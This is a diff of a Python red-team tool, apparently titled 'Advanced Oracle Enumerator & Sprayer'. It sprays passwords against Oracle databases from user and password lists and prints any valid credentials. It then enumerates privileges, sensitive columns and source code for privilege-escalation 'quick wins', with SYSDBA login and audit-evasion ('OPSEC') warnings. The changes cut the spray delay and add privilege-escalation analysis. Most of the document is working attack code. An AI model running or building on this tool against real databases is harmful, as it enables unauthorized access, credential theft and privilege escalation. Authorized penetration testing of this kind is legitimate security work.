@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
-#Aurhtor: hamb0n-3
-from __future__ import annotations
+# Author: hamb0n-3
 
 import argparse
 import getpass
@@ -8,12 +7,22 @@ import itertools
 import json
 import logging
 import re
-import sys, time
+import sys
+import time
 from pathlib import Path
 from typing import Iterable, List, Tuple
 
-import cx_Oracle as oradb
-import pandas as pd
+try:
+    import cx_Oracle as oradb
+except ImportError:
+    print("Error: The 'oracledb' (formerly cx_Oracle) package is required. Please install it with 'pip install oracledb'", file=sys.stderr)
+    sys.exit(1)
+
+try:
+    import pandas as pd
+except ImportError:
+    print("Error: The 'pandas' package is required. Please install it with 'pip install pandas'", file=sys.stderr)
+    sys.exit(1)
 
 
 ###############################################################################
@@ -81,14 +90,10 @@ def generate_login_combos(args) -> List[Tuple[str, str, str]]:
     # Static/Enum Mode
     creds = []
 
-    # Consolidate credentials from all sources (-c, -C, --creds-file)
     c_list = []
-    if args.c:
-        c_list.append(args.c)
-    if args.C:
-        c_list.extend(split_csv(args.C))
-    if args.creds_file:
-        c_list.extend(read_file_lines(args.creds_file))
+    if args.c: c_list.append(args.c)
+    if args.C: c_list.extend(split_csv(args.C))
+    if args.creds_file: c_list.extend(read_file_lines(args.creds_file))
 
     d_list = split_csv(args.dsn_list)
     if not c_list:
@@ -96,19 +101,14 @@ def generate_login_combos(args) -> List[Tuple[str, str, str]]:
         sys.exit(1)
 
     for idx, tok in enumerate(c_list):
-        # Manual parsing is more robust to special characters in passwords than regex
         user, pw, dsn = None, None, None
-
-        user_pw_part, dsn_part = tok, None
+        user_pw_part = tok
         if '@' in tok:
             parts = tok.rsplit('@', 1)
-            user_pw_part = parts[0]
-            dsn = parts[1]
+            user_pw_part, dsn = parts[0], parts[1]
 
         if ':' in user_pw_part:
-            parts = user_pw_part.split(':', 1)
-            user = parts[0]
-            pw = parts[1]
+            user, pw = user_pw_part.split(':', 1)
         else:
             user = user_pw_part
 
@@ -116,32 +116,32 @@ def generate_login_combos(args) -> List[Tuple[str, str, str]]:
              logging.error("Bad credential format: '%s'. Could not parse username.", tok)
              continue
 
-        if pw is None: # Explicitly check for None, as '' is a valid (empty) password.
+        if pw is None:
             if args.ask_pass:
                 pw = getpass.getpass(f"Enter password for {user}@{dsn or '...'}: ")
             else:
                 logging.error("Password missing for '%s'. Use 'user:pw' format or provide -P/--ask-pass.", tok)
                 sys.exit(1)
 
+        # Corrected DSN assignment logic
         if not dsn:
-            if idx < len(d_list):
+            if len(d_list) == 1:
+                dsn = d_list[0]
+            elif idx < len(d_list):
                 dsn = d_list[idx]
             else:
-                logging.error("Missing DSN for credential '%s'. Provide it via @dsn or with -d/--dsn or -D/--dsn-list.", tok)
+                logging.error("Missing DSN for credential '%s'. Provide it via @dsn or with -d/-D/--dsn-file.", tok)
                 sys.exit(1)
         creds.append((user, pw, dsn))
     return creds
 
 ###############################################################################
-# --- (SQL generators, File writers, and Enumeration logic are unchanged) --- #
-# ... (All functions from build_sqls to process_connection are here) ...
+# ----------------------- SQL & Enumeration Logic ---------------------------- #
 ###############################################################################
+
 def _build_sensitive_source_query(prefix: str, search_terms: List[str], noise_filter: str) -> str:
     """Builds the SQL to find sensitive keywords in source code with context."""
     like_clause = _build_like_clause('s.text', search_terms)
-    # The WHERE clause must be applied to the inner subquery for performance
-    # and to the outer query to filter the final results.
-    # The noise filter is applied inside the subquery to reduce the dataset early.
     return f"""
     WITH source_with_context AS (
       SELECT
@@ -172,7 +172,6 @@ def build_sqls(prefix: str, categories: List[str], search_terms: List[str]) -> d
     noise_filter = "AND owner NOT IN ('SYS', 'SYSTEM', 'ORDSYS', 'MDSYS', 'CTXSYS', 'XDB', 'DBSNMP', 'ORDDATA', 'OLAPSYS', 'WMSYS', 'EXFSYS', 'APPQOSSYS', 'DVSYS', 'AUDSYS')"
 
     def get_user_priv_queries(cats: List[str]) -> dict[str, str]:
-        """Returns queries for privs granted to the current user. Used by ALL_ and USER_ scopes."""
         user_sql = {}
         if "roles" in cats: user_sql["roles"] = "SELECT USER as owner, granted_role, admin_option, delegate_option, default_role FROM USER_ROLE_PRIVS ORDER BY granted_role"
         if "sys" in cats: user_sql["sys"] = """SELECT USER as owner, privilege, admin_option, 'DIRECT' AS granted_through FROM USER_SYS_PRIVS UNION ALL SELECT USER as owner, rsp.privilege, rsp.admin_option, urp.granted_role AS granted_through FROM ROLE_SYS_PRIVS rsp JOIN USER_ROLE_PRIVS urp ON rsp.role = urp.granted_role ORDER BY privilege"""
@@ -180,9 +179,7 @@ def build_sqls(prefix: str, categories: List[str], search_terms: List[str]) -> d
         if "quotas" in cats: user_sql["quotas"] = "SELECT USER as owner, tablespace_name, bytes, max_bytes, blocks, max_blocks FROM USER_TS_QUOTAS"
         return user_sql
 
-    # SCOPE 1: DBA - Assumes full power. Can query for any user.
     if p == 'DBA_':
-        logging.debug("Building DBA-scope SQL queries.")
         if "roles" in categories: sql["roles"] = "SELECT * FROM DBA_ROLE_PRIVS WHERE grantee = :bind_user ORDER BY granted_role"
         if "sys" in categories: sql["sys"] = "SELECT privilege, admin_option, grantee AS granted_to FROM DBA_SYS_PRIVS WHERE grantee = :bind_user UNION ALL SELECT p.privilege, p.admin_option, r.grantee FROM DBA_SYS_PRIVS p JOIN DBA_ROLE_PRIVS r ON r.granted_role = p.grantee WHERE r.grantee = :bind_user ORDER BY privilege"
         if "obj" in categories: sql["obj"] = "SELECT owner, table_name, privilege, grantable, grantor, grantee FROM DBA_TAB_PRIVS WHERE grantee = :bind_user UNION ALL SELECT t.owner, t.table_name, t.privilege, t.grantable, t.grantor, r.grantee FROM DBA_TAB_PRIVS t JOIN DBA_ROLE_PRIVS r ON r.granted_role = t.grantee WHERE r.grantee = :bind_user ORDER BY owner, table_name, privilege"
@@ -195,10 +192,7 @@ def build_sqls(prefix: str, categories: List[str], search_terms: List[str]) -> d
             sql["sensitive_columns"] = f"SELECT owner, table_name, column_name FROM DBA_TAB_COLUMNS WHERE {_build_like_clause('column_name', search_terms)} {noise_filter} ORDER BY owner, table_name"
             sql["sensitive_source_context"] = _build_sensitive_source_query(p, search_terms, noise_filter)
         return sql
-
-    # SCOPE 2: ALL - For what the user can see across schemas. Enumeration target is always the logged-in user.
     elif p == 'ALL_':
-        logging.debug("Building ALL-scope SQL queries.")
         sql = get_user_priv_queries(categories)
         if "obj" in categories: sql["obj"] = "SELECT owner, table_name, privilege, grantable, grantor, grantee FROM ALL_TAB_PRIVS WHERE grantee = :bind_user ORDER BY owner, table_name, privilege"
         if "col" in categories: sql["col"] = "SELECT owner, table_name, column_name, privilege, grantable, grantor, grantee FROM ALL_COL_PRIVS WHERE grantee = :bind_user ORDER BY owner, table_name, column_name, privilege"
@@ -208,10 +202,7 @@ def build_sqls(prefix: str, categories: List[str], search_terms: List[str]) -> d
             sql["sensitive_columns"] = f"SELECT owner, table_name, column_name FROM ALL_TAB_COLUMNS WHERE {_build_like_clause('column_name', search_terms)} ORDER BY owner, table_name"
             sql["sensitive_source_context"] = _build_sensitive_source_query(p, search_terms, "")
         return sql
-
-    # SCOPE 3: USER - For what the user owns. Enumeration target is always the logged-in user.
     elif p == 'USER_':
-        logging.debug("Building USER-scope SQL queries.")
         sql = get_user_priv_queries(categories)
         if "obj" in categories: sql["obj"] = "SELECT USER as owner, table_name, privilege, grantable, grantor, grantee FROM USER_TAB_PRIVS ORDER BY grantee, table_name, privilege"
         if "col" in categories: sql["col"] = "SELECT USER as owner, table_name, column_name, privilege, grantable, grantor, grantee FROM USER_COL_PRIVS ORDER BY grantee, table_name, column_name, privilege"
@@ -221,9 +212,7 @@ def build_sqls(prefix: str, categories: List[str], search_terms: List[str]) -> d
             sql["sensitive_columns"] = f"SELECT USER as owner, table_name, column_name FROM USER_TAB_COLUMNS WHERE {_build_like_clause('column_name', search_terms)} ORDER BY table_name"
             sql["sensitive_source_context"] = _build_sensitive_source_query(p, search_terms, "")
         return sql
-
     return sql
-
 
 def fetch_frames(cur, stmts: dict[str, str], user: str) -> dict[str, pd.DataFrame]:
     dfs = {}
@@ -240,7 +229,6 @@ def fetch_frames(cur, stmts: dict[str, str], user: str) -> dict[str, pd.DataFram
             cur.execute(sql, bind_vars)
             cols = [d[0] for d in cur.description] if cur.description else []
             df = pd.DataFrame(cur.fetchall(), columns=cols)
-            # Post-processing for context view to remove newlines for cleaner output
             if name == "sensitive_source_context":
                 for col in df.columns:
                     if "line" in col and df[col].dtype == 'object':
@@ -279,7 +267,6 @@ def dump_outputs(dfs, stem: str, outdir: Path, formats: Iterable[str]):
 def pick_prefix(cur, scope_arg: str) -> str:
     """
     Determines the best accessible data dictionary prefix (DBA_, ALL_, USER_).
-    Tries each prefix in order and returns the first one that works, unless overridden by the user.
     """
     if scope_arg != "auto":
         prefix = f"{scope_arg.upper()}_"
@@ -288,7 +275,7 @@ def pick_prefix(cur, scope_arg: str) -> str:
 
     logging.info("Automatically detecting best view prefix...")
     for prefix in PREFIX_ORDER:
-        test_view = f"{prefix}TABLES"  # A common view to test for accessibility
+        test_view = f"{prefix}TABLES"
         try:
             cur.execute(f"SELECT 1 FROM {test_view} WHERE 1=0")
             logging.info("Successfully queried from '%s'. Using '%s' prefix for enumeration.", test_view, prefix)
@@ -297,15 +284,11 @@ def pick_prefix(cur, scope_arg: str) -> str:
             err, = e.args
             if err.code == 942:  # ORA-00942: table or view does not exist
                 logging.debug("Prefix test failed for '%s': view not accessible.", prefix)
-                continue  # Try the next prefix
+                continue
             else:
                 logging.warning("Unexpected DB error while testing prefix '%s': %s", prefix, e)
-
-    logging.error("Could not access any standard dictionary views (DBA_, ALL_, USER_). Cannot proceed with enumeration.")
-    # Return an empty string or raise an exception to halt enumeration for this connection
+    logging.error("Could not access any standard dictionary views (DBA_, ALL_, USER_). Cannot proceed.")
     return ""
-
-
 
 def handle_direct_query(creds, args):
     query = args.query.strip()
@@ -315,11 +298,10 @@ def handle_direct_query(creds, args):
         return
 
     mode = oradb.SYSDBA if args.as_sysdba else oradb.DEFAULT_AUTH
-
     for user, pw, dsn in creds:
         print(f"\n---[ Executing query on {user}@{dsn} (Mode: {'SYSDBA' if args.as_sysdba else 'Normal'}) ]---")
         try:
-            with oradb.connect(user, pw, dsn, mode=mode) as conn:
+            with oradb.connect(user=user, password=pw, dsn=dsn, mode=mode) as conn:
                 with conn.cursor() as cur:
                     cur.execute(query)
                     if cur.description:
@@ -337,12 +319,10 @@ def handle_direct_query(creds, args):
 def handle_spraying(creds, args):
     successes = []
     mode = oradb.SYSDBA if args.as_sysdba else oradb.DEFAULT_AUTH
-
     for user, pw, dsn in creds:
         try:
             logging.debug("Attempting -> %s:%s@%s", user, '********', dsn)
-            with oradb.connect(user, pw, dsn, mode=mode):
-                # If connect succeeds, we have a winner
+            with oradb.connect(user=user, password=pw, dsn=dsn, mode=mode):
                 success_str = f"[+] SUCCESS: {user}:{pw}@{dsn} (Mode: {'SYSDBA' if args.as_sysdba else 'Normal'})"
                 logging.critical(success_str)
                 successes.append(success_str)
@@ -350,59 +330,73 @@ def handle_spraying(creds, args):
             err, = exc.args
             if err.code == 1017: # ORA-01017: invalid username/password
                 logging.debug("Failed login for %s@%s (ORA-01017)", user, dsn)
-            else: # Other DB errors are more interesting
+            else:
                 logging.warning("DB Error for %s@%s: %s", user, dsn, str(err.message).strip())
         except Exception as exc:
             logging.error("Critical error for %s@%s: %s", user, dsn, exc)
-
         finally:
-        	time.sleep(1)
+            time.sleep(0.1)
 
     if successes:
         print("\n--- Valid Credentials Found ---")
-        for s in successes:
-            print(s)
+        for s in successes: print(s)
     else:
         print("\n--- No valid credentials found ---")
 
 def handle_enumeration(creds, args):
+    """Handles the main enumeration logic, including the new OPSEC confirmation prompt."""
     targets = split_csv(args.T) if args.T else ([args.t] if args.t else [])
     cats = split_csv(args.include.lower())
     fmts = split_csv(args.output.lower())
-    search_terms = split_csv(args.search_terms.lower())
+    search_terms = split_csv(args.search_terms.lower()) or split_csv(DEFAULT_SENSITIVE_TERMS)
     outdir = Path(args.outdir)
     mode = oradb.SYSDBA if args.as_sysdba else oradb.DEFAULT_AUTH
 
     for user, pw, dsn in creds:
         logging.info("--- Starting enumeration for login user %s@%s (Mode: %s) ---", user, dsn, 'SYSDBA' if args.as_sysdba else 'Normal')
         try:
-            with oradb.connect(user, pw, dsn, mode=mode) as conn:
+            with oradb.connect(user=user, password=pw, dsn=dsn, mode=mode) as conn:
                 with conn.cursor() as cur:
-                    # Grant catalog role if requested
                     if args.grant_catalog_role:
-                        # (Implementation would go here)
                         logging.warning("OPSEC: --grant-catalog-role is an audited DDL action.")
+                        # Implementation would go here
 
-                    # Determine best view prefix
                     prefix = pick_prefix(cur, args.scope)
                     if not prefix:
-                        # If no prefix could be determined, we can't enumerate this connection.
                         logging.error("Halting enumeration for %s@%s due to lack of view access.", user, dsn)
-                        continue # Move to the next credential in the list
-
+                        continue
 
                     enum_targets = targets or [user]
                     if prefix != "DBA_" and (targets and set(t.upper() for t in targets) != {user.upper()}):
-                        logging.warning(
-                            "Non-DBA scope ('%s') detected. Privilege enumeration can only be run for the logged-in user ('%s').",
-                            prefix.strip('_'), user
-                        )
-                        logging.warning("Ignoring specified targets: %s", ", ".join(targets))
+                        logging.warning("Non-DBA scope ('%s') detected. Can only enum logged-in user ('%s').", prefix.strip('_'), user)
                         enum_targets = [user]
 
                     for tgt_user in enum_targets:
-                        logging.info("Enumerating data for target user: %s", tgt_user.upper())
+                        logging.info("Preparing to enumerate data for target user: %s", tgt_user.upper())
                         sqls = build_sqls(prefix, cats, search_terms)
+
+                        if not sqls:
+                            logging.warning("No SQL queries generated for target '%s'. Skipping.", tgt_user)
+                            continue
+
+                        print(f"\n[OPSEC] About to execute {len(sqls)} SQL statement(s) for target '{tgt_user.upper()}' on {dsn}.")
+                        try:
+                            sys.stdout.flush()
+                            # If not running in an interactive terminal, default to 'n'
+                            if not sys.stdout.isatty():
+                                print("Non-interactive session detected. Aborting to prevent unintended scans.")
+                                logging.warning("Non-interactive session. Aborting enumeration for '%s'.", tgt_user)
+                                continue
+                            confirm = input("    > Do you want to proceed? (y/N): ").strip().lower()
+                        except (EOFError, KeyboardInterrupt):
+                            print("\nConfirmation cancelled. Aborting execution.")
+                            logging.warning("Execution cancelled by user for target '%s'.", tgt_user)
+                            sys.exit(0)
+
+                        if confirm != 'y':
+                            logging.warning("Execution cancelled by user for target '%s'. Skipping.", tgt_user)
+                            continue
+
                         dfs = fetch_frames(cur, sqls, tgt_user.upper())
                         if not dfs: continue
                         analyze_for_privesc(dfs)
@@ -414,8 +408,21 @@ def handle_enumeration(creds, args):
         except Exception as exc:
             logging.error("Critical failure for %s@%s: %s", user, dsn, exc)
 
-# Dummy analyze_for_privesc for brevity
-def analyze_for_privesc(dfs): pass
+def analyze_for_privesc(dfs):
+    """Analyzes collected dataframes for known high-impact privs for quick wins."""
+    logging.info("Analyzing collected privileges for quick wins...")
+    if "sys" in dfs and not dfs["sys"].empty:
+        user_privs = set(dfs["sys"]["PRIVILEGE"].str.upper())
+        for priv, desc in HIGH_IMPACT_SYS_PRIVS.items():
+            if priv in user_privs:
+                logging.critical("[PRIVESC] High-impact system privilege found: %s - %s", priv, desc)
+
+    if "obj" in dfs and not dfs["obj"].empty:
+        df_obj = dfs["obj"]
+        exec_privs = df_obj[df_obj["PRIVILEGE"].str.upper() == "EXECUTE"]
+        for obj_name, (priv, desc) in HIGH_IMPACT_OBJ_PRIVS.items():
+            if not exec_privs[exec_privs["TABLE_NAME"].str.upper() == obj_name].empty:
+                logging.critical("[PRIVESC] High-impact object privilege found: EXECUTE on %s - %s", obj_name, desc)
 
 ###############################################################################
 # ---------------------------- CLI & main driver ---------------------------- #
@@ -423,25 +430,21 @@ def analyze_for_privesc(dfs): pass
 
 def build_parser() -> argparse.ArgumentParser:
     p = argparse.ArgumentParser(description="Advanced Oracle Enumerator & Sprayer for Red Teams.", formatter_class=argparse.RawTextHelpFormatter)
-
     cred_group = p.add_argument_group("Credential & Connection (for Enum/Query Modes)")
     cred_group.add_argument("-C", metavar="list", help="Comma-separated list: user[:pw][@dsn],...")
     cred_group.add_argument("-c", metavar="pair", help="Single credential: user[:pw]")
     cred_group.add_argument("--creds-file", help="File with one credential per line (user[:pw][@dsn]).")
     cred_group.add_argument("-P", "--ask-pass", action="store_true", help="Prompt for passwords interactively.")
     cred_group.add_argument("--as-sysdba", action="store_true", help="Connect with SYSDBA privilege. OPSEC WARNING: This is highly audited.")
-
     spray_group = p.add_argument_group("Password Spraying Mode")
     spray_group.add_argument("--users-file", help="File with one username per line.")
     spray_group.add_argument("--pass-file", help="File with one password per line.")
     spray_group.add_argument("--login-user", help="Single username for spraying.")
     spray_group.add_argument("--login-pass", help="Single password for spraying.")
-
     dsn_group = p.add_argument_group("DSN Management (All Modes)")
     dsn_group.add_argument("-D", "--dsn-list", metavar="list", help="Comma-separated DSN list (e.g., host/svc,host2/svc2)")
     dsn_group.add_argument("-d", "--dsn", metavar="dsn", help="Single DSN (shortcut for -D)")
     dsn_group.add_argument("--dsn-file", help="File with one DSN per line.")
-
     enum_group = p.add_argument_group("Enumeration Mode")
     enum_group.add_argument("-T", metavar="list", help="Target users to enumerate (comma-separated)")
     enum_group.add_argument("-t", metavar="name", help="Single target user to enumerate")
@@ -451,27 +454,16 @@ def build_parser() -> argparse.ArgumentParser:
     enum_group.add_argument("-g", "--grant-catalog-role", action="store_true", help="Attempt to grant SELECT_CATALOG_ROLE (AUDITED!)")
     enum_group.add_argument("-o", "--output", default="excel", help="Formats: excel,csv,json")
     enum_group.add_argument("-O", "--outdir", default=".", help="Directory for result files")
-
     query_group = p.add_argument_group("Direct Query Mode")
     query_group.add_argument("-q", "--query", metavar="SQL", help="Execute a single query and print results.")
     query_group.add_argument("--force", action="store_true", help="Allow non-SELECT queries with -q (DANGEROUS).")
-
     p.add_argument("-L", "--log-file", help="Save verbose output to a log file.")
     p.add_argument("-v", "--verbose", action="count", default=0, help="Increase verbosity (-v for INFO, -vv for DEBUG)")
     return p
 
 def main(argv: List[str] | None = None):
     args = build_parser().parse_args(argv)
-
-    # Setup logging level
-    if args.verbose == 1:
-        log_level = logging.INFO
-    elif args.verbose >= 2:
-        log_level = logging.DEBUG
-    else:
-        log_level = logging.WARNING
-
-    # Configure logging
+    log_level = logging.INFO if args.verbose == 1 else (logging.DEBUG if args.verbose >= 2 else logging.WARNING)
     log_handlers = [logging.StreamHandler(sys.stdout)]
     if args.log_file:
         try:
@@ -479,36 +471,25 @@ def main(argv: List[str] | None = None):
         except (IOError, OSError) as e:
             print(f"Error: Could not open log file '{args.log_file}'. {e}", file=sys.stderr)
             sys.exit(1)
+    logging.basicConfig(level=log_level, format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S", handlers=log_handlers)
 
-    logging.basicConfig(
-        level=log_level,
-        format="%(asctime)s [%(levelname)s] %(message)s",
-        datefmt="%Y-%m-%d %H:%M:%S",
-        handlers=log_handlers
-    )
-
-    # Unify all DSN sources into a single list for downstream functions
     all_dsns = []
-    if args.dsn_list:
-        all_dsns.extend(split_csv(args.dsn_list))
-    if args.dsn:
-        all_dsns.append(args.dsn)
-    if args.dsn_file:
-        all_dsns.extend(read_file_lines(args.dsn_file))
-
-    # Overwrite args.dsn_list with the complete, deduplicated list.
-    # dict.fromkeys preserves order while removing duplicates.
+    if args.dsn_list: all_dsns.extend(split_csv(args.dsn_list))
+    if args.dsn: all_dsns.append(args.dsn)
+    if args.dsn_file: all_dsns.extend(read_file_lines(args.dsn_file))
     args.dsn_list = ",".join(list(dict.fromkeys(all_dsns)))
 
-    # --- Mode Dispatcher ---
     creds = generate_login_combos(args)
     if not creds:
         logging.warning("No valid credential combinations to test.")
         return
 
-    if args.users_file or args.login_user:
+    is_spray_mode = args.users_file or args.login_user
+    is_query_mode = args.query
+
+    if is_spray_mode:
         handle_spraying(creds, args)
-    elif args.query:
+    elif is_query_mode:
         handle_direct_query(creds, args)
     else:
         handle_enumeration(creds, args)
